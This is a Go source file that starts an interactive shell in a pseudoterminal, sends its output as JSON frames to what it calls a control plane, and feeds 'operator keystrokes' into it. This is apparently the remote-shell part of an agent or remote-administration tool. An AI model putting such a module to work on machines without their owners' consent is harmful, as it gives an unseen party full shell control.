package terminal

import (
	"encoding/json"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"

	"github.com/creack/pty"
)

// Session manages an active interactive pseudoterminal attached to a shell.
type Session struct {
	cmd  *exec.Cmd
	ptmx *os.File
	done chan struct{}
	once sync.Once
}

// OutboundMessage represents the JSON envelope pushed to the control plane.
type OutboundMessage struct {
	Type    string `json:"type"`
	Payload string `json:"payload"`
}

func resolveInteractiveShell() string {
	if runtime.GOOS == "windows" {
		if path, err := exec.LookPath("powershell.exe"); err == nil {
			return path
		}
		return "cmd.exe"
	}
	if path, err := exec.LookPath("/bin/bash"); err == nil {
		return path
	}
	return "/bin/sh"
}

// NewSession spawns an interactive shell inside a newly allocated PTY.
func NewSession() (*Session, error) {
	shellPath := resolveInteractiveShell()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if strings.Contains(strings.ToLower(shellPath), "powershell") {
			cmd = exec.Command(shellPath, "-NoLogo")
		} else {
			cmd = exec.Command(shellPath)
		}
	} else {
		cmd = exec.Command(shellPath, "-i")
	}
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return nil, err
	}

	return &Session{
		cmd:  cmd,
		ptmx: ptmx,
		done: make(chan struct{}),
	}, nil
}

// StartOutputPump streams raw PTY output chunks into the outbound channel as JSON frames.
func (s *Session) StartOutputPump(outboundChan chan<- []byte) {
	go func() {
		defer s.Close()
		buf := make([]byte, 2048)

		for {
			n, err := s.ptmx.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Printf("[-] [PTY] Read error: %v", err)
				}
				break
			}

			if n > 0 {
				msg := OutboundMessage{
					Type:    "term_out",
					Payload: string(buf[:n]),
				}

				payloadBytes, err := json.Marshal(msg)
				if err == nil {
					select {
					case outboundChan <- payloadBytes:
					case <-s.done:
						return
					}
				}
			}
		}
	}()
}

// WriteInput injects incoming raw operator keystrokes directly into the PTY stdin.
func (s *Session) WriteInput(data []byte) error {
	_, err := s.ptmx.Write(data)
	return err
}

// Close ensures deterministic cleanup of both the PTY file handle and child process.
func (s *Session) Close() {
	s.once.Do(func() {
		close(s.done)
		if s.ptmx != nil {
			_ = s.ptmx.Close()
		}
		if s.cmd != nil && s.cmd.Process != nil {
			_ = s.cmd.Process.Kill()
			_ = s.cmd.Wait()
		}
		log.Println("[*] [PTY] Interactive shell session terminated and resources released.")
	})
}
